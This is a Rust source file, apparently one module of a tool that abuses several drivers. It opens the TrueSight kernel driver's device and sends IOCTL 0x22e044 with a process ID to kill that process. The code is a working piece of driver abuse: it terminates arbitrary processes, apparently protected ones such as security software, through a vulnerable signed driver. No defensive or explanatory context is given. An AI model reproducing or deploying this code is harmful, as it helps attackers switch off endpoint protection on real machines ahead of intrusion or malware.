use std::ffi::c_void;
use windows::Win32::{Foundation::HANDLE, System::IO::DeviceIoControl};

use crate::{win32::connect_to_device, DriverBuilder};

pub struct TrueSight {
    device: HANDLE,
    pid: u32,
}

impl DriverBuilder for TrueSight {
    fn build(pid: u32) -> Result<Box<dyn DriverBuilder>, String> {
        let device = connect_to_device("\\\\.\\TrueSight")?;

        return Ok(Box::new(TrueSight { device, pid }));
    }

    fn kill(&self) -> Result<(), String> {
        let mut dw_bytes_returned: u32 = 0;

        if let Err(_) = unsafe {
            DeviceIoControl(
                self.device,
                0x22e044,
                Some(&self.pid as *const _ as *const c_void),
                std::mem::size_of::<u32>() as u32,
                None,
                0,
                Some(&mut dw_bytes_returned),
                None,
            )
        } {
            return Err("Could not kill process with PID ".to_owned() + &self.pid.to_string());
        }

        return Ok(());
    }
}
